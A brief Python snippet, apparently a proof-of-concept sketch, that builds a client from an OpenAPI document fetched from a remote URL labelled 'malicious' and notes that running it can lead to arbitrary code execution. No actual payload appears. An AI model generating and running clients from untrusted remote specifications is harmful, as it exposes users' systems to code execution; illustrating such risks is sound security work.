import openapi_client

# Generate a client from a maliciously crafted OpenAPI document
client = openapi_client.Client.from_url("https://example.com/malicious_openapi.json")

# Execute the client, which can lead to arbitrary code execution
client.execute()